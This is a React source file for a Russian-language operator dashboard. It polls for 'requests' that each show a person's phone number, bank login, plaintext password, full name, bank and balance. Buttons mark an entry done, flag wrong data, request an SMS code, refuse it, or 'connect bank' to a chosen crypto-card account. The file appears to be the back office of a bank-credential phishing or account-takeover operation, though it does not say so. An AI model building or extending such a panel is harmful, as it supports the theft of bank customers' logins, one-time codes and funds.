import React, { useEffect, useState } from "react";
import { Alert, Badge, Button, Modal, Stack } from "react-bootstrap";
import Col from 'react-bootstrap/Col';
import Form from 'react-bootstrap/Form';
import Row from 'react-bootstrap/Row';
import styles from './ListOrders.module.css';
import { connectedWalletAPI, deletedWalletAPI, GetNewRequest, resetWalletAPI, resetWalletSMSAPI, stopWalletAPI } from "../../api/details";
import { getCryptoCards, updateCryptoCardIdWallet, updateWalletAccountCryptoCardId } from "../../api/main";

function ListOrders() {

    const [orders, setOrders] = useState([]);
    const [cryptoCards, setCryptoCards] = useState([]);
    const [tick, setTick] = useState(false);
    const [isTick, setIsTick] = useState(false);

    async function DidMount() {

        setCryptoCards([{id: -1, name: "Все"}, ...((await getCryptoCards()) ?? [])]);
    }

    async function DidMountOrders() {

        const orders = await GetNewRequest();
        setOrders(orders ?? []);
    }

    useEffect(() => {

        DidMount();
        DidMountOrders();
    }, []);
    
    useEffect(()=>{

        if(!isTick)
            return;

        const timerID = setInterval(() => setTick(!tick), 3000);
        DidMountOrders();
        return () => clearInterval(timerID);
      }, [isTick, tick]);

    const OrderItem = ({ order }) => {

        const [isSendSuccess, setIsSendSuccess] = useState(false);
        const [accountCryptoCardId, setAccountCryptoCardId] = useState(null);

        if (isSendSuccess)
            return <Modal show={isSendSuccess} onHide={() => setIsSendSuccess(false)}
        size="lg"
        aria-labelledby="contained-modal-title-vcenter"
        centered>
                <Modal.Header closeButton>
                    <Modal.Title>Подтвердить</Modal.Title>
                </Modal.Header>
                <Modal.Body>
                    <Form>
                        <Form.Group as={Row} className="mb-3" controlId="formPlaintextEmail">
                            <Form.Label column sm="2">
                                CC Аккаунт:
                            </Form.Label>
                            <Col sm="10">
                                <Form.Select aria-label="Default select example" value={accountCryptoCardId ?? -1} onChange={async (e) => {

                                    const newValue = e.target.value == -1 ? null : e.target.value;

                                    if (!newValue) {
                                        alert("К сожалению нельзя поставить на несуществующую платформу");
                                        return;
                                    }

                                    await updateWalletAccountCryptoCardId(order.id, newValue);
                                    setAccountCryptoCardId(newValue);
                                }}>{
                                        cryptoCards && cryptoCards.length > 0 ?
                                            cryptoCards.map((o, i) => <option key={i} value={o.id}>{o.name}</option>) : ''
                                    }</Form.Select>
                            </Col>
                        </Form.Group>
                    </Form>
                </Modal.Body>
                <Modal.Footer>
                    <Button onClick={async () => await connectedWalletAPI(order.id) || setOrders(orders.filter(o => o.id != order.id))}>Подключить банк</Button>
                </Modal.Footer>
            </Modal>

        return <div className={styles.elementOrder}>
            <Form>
                <Row>
                    <Col>
                        <Form.Group as={Row} className="mb-3" controlId="formPlaintextEmail">
                            <Form.Label column sm="2">
                                ID: {order.id}
                            </Form.Label>
                            <Col sm="10">
                                <h4><Badge>{order.status}</Badge></h4>
                            </Col>
                        </Form.Group>
                        <Form.Group as={Row} className="mb-3" controlId="formPlaintextEmail">
                            <Form.Label column sm="2">
                                Телефон
                            </Form.Label>
                            <Col sm="10">
                                <Form.Control type="phone" plaintext readOnly value={order.phoneNumber} />
                            </Col>
                        </Form.Group>
                        <Form.Group as={Row} className="mb-3" controlId="formPlaintextEmail">
                            <Form.Label column sm="2">
                                Логин
                            </Form.Label>
                            <Col sm="10">
                                <Form.Control type="text" plaintext readOnly value={order.login} />
                            </Col>
                        </Form.Group>
                        <Form.Group as={Row} className="mb-3" controlId="formPlaintextEmail">
                            <Form.Label column sm="2">
                                Пароль
                            </Form.Label>
                            <Col sm="10">
                                <Form.Control type="text" plaintext readOnly value={order.password} />
                            </Col>
                        </Form.Group>
                        <Form.Group as={Row} className="mb-3" controlId="formPlaintextEmail">
                            <Form.Label column sm="2">
                                ФИО
                            </Form.Label>
                            <Col sm="10">
                                <Form.Control type="text" plaintext readOnly value={order.fio} />
                            </Col>
                        </Form.Group>
                        <Form.Group as={Row} className="mb-3" controlId="formPlaintextEmail">
                            <Form.Label column sm="2">
                                Банк
                            </Form.Label>
                            <Col sm="10">
                                <Form.Control type="text" plaintext readOnly value={order.bank} />
                            </Col>
                        </Form.Group>
                        <Form.Group as={Row} className="mb-3" controlId="formPlaintextEmail">
                            <Form.Label column sm="2">
                                Баланс
                            </Form.Label>
                            <Col sm="10">
                                <Form.Control type="text" plaintext readOnly value={order.balance} />
                            </Col>
                        </Form.Group>
                    </Col>
                    <Col>
                        <div className={styles.buttonGroup + ' d-grid gap-2'}>
                            <Button variant="success" onClick={async () => order.status == 'Stopping' ? setOrders(orders.filter(o => o.id != order.id)) || await stopWalletAPI(order.id) : setIsSendSuccess(true)}>Готово</Button>
                            {
                                order.status == 'Stopping' ? '' :
                                    <React.Fragment>
                                        <Button variant="warning" onClick={async () => setOrders(orders.filter(o => o.id != order.id)) || await resetWalletAPI(order.id)}>Неверные данные</Button>
                                        <Button variant="warning" onClick={async () => setOrders(orders.filter(o => o.id != order.id)) || await resetWalletSMSAPI(order.id)}>СМС</Button>
                                        <Button variant="danger" onClick={async () => setOrders(orders.filter(o => o.id != order.id)) || await deletedWalletAPI(order.id)}>Отказ</Button>
                                    </React.Fragment>
                            }
                        </div>
                    </Col>
                </Row>
            </Form>
        </div>
    }

    return <div>
        <h1>Заявки</h1>
        {
            orders.length <= 0 ?
                <Alert variant="warning" style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between' }}>
                    <span>К сожаление сейчас нет заявок</span>
                    <Stack gap={3} direction="horizontal">
                    <Button variant="warning" onClick={DidMountOrders}>Обновить</Button>
                    <Button variant="warning" onClick={() => setIsTick(!isTick)}>{isTick ? "Выключить" : "Включить"} таймер</Button>
                    </Stack>
                </Alert>
                :
                <React.Fragment>
                    {orders.map(o => <OrderItem key={o.id} order={o} />)}
                    <Stack gap={3} direction="horizontal">
                    <Button variant="warning" onClick={DidMountOrders}>Обновить</Button>
                    <Button variant="warning" onClick={() => setIsTick(!isTick)}>{isTick ? "Выключить" : "Включить"} таймер</Button>
                    </Stack>
                </React.Fragment>
        }
    </div>
}

export default ListOrders;